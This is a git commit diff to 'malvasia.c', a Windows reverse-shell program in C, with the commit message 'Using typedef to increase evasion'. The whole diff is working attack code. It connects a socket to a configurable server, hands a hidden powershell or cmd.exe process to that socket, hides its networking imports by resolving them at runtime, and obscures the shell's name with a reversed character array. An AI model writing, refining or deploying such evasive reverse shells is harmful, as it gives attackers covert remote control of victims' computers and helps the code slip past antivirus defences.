cc1b753223a8542c72b7785ead7c483092ba9a17
Filippo *ZinzlouN* Bersani <filobers@protonmail.com>
2024-02-28 17:59:09 +0100

    Using typedef to increase evasion

--- malvasia.c
+++ malvasia.c
@@ -7,7 +7,16 @@
 #include <stdlib.h>
 #include <string.h>
 
+typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
+typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
+typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
+typedef u_short(WSAAPI* HTONS)(u_short hostshort);
+typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
+
 int main(int argc, char **argv) {
+
+	HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
+	WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
 
 	// configure here the server address and port
 	char *server_IP = "127.0.0.1";
@@ -22,20 +31,23 @@ int main(int argc, char **argv) {
 
 	
 	WSADATA wsaData;
-	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
+	if (myWSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
 		printf("-->Error: WSASturtup failed.\n");
 		return 1;
 	}
 
+	WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
+	INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
+	HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
+
+
 	int port = server_port;
 	struct sockaddr_in malsa;
-	SOCKET mysock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	SOCKET mysock = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 	malsa.sin_family = AF_INET;
-	malsa.sin_port = htons(port);
-	malsa.sin_addr.s_addr = inet_addr(server_IP);
+	malsa.sin_port = myhtons(port);
+	malsa.sin_addr.s_addr = myinet_addr(server_IP);
 
-	
-	Sleep(500);
 	
 	if (connect(mysock, (struct sockaddr *) &malsa, sizeof(malsa)) != 0) {
 		printf("--> ERROR: Connection failed.\n");
@@ -44,17 +56,20 @@ int main(int argc, char **argv) {
 
 	//obfuscate a bit ______________________________________________
 	char arr_pot[] = {'\0','l','l','e','h','s','r','e','w','o','p'};
+	// if you want you go classic
+	//char arr_pot[] = {'\0','e','x','e','.','d','m','c'};
 	char tmp; int i, j; 
-
-	for (i = 0, j = 10; i < j; i++, j--) { // loop to swap elements
+	int length = sizeof(arr_pot) / sizeof(arr_pot[0]);
+	
+	for (i = 0, j = (length - 1); i < j; i++, j--) { // loop to swap elements
         tmp = arr_pot[i];
         arr_pot[i] = arr_pot[j];
         arr_pot[j] = tmp;
     }
 
 	// printf(" %s\n", arr_pot);
-	//______________________________________________________________
-		
+	
+
 	STARTUPINFO sinfo;
 	memset(&sinfo, 0, sizeof(sinfo));
 	sinfo.cb = sizeof(sinfo);
@@ -63,6 +78,7 @@ int main(int argc, char **argv) {
 	sinfo.hStdOutput = (HANDLE) mysock;
 	sinfo.hStdError = (HANDLE) mysock;
 	PROCESS_INFORMATION pinfo;
+	
 	CreateProcessA(NULL, arr_pot, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 
 	return 0;
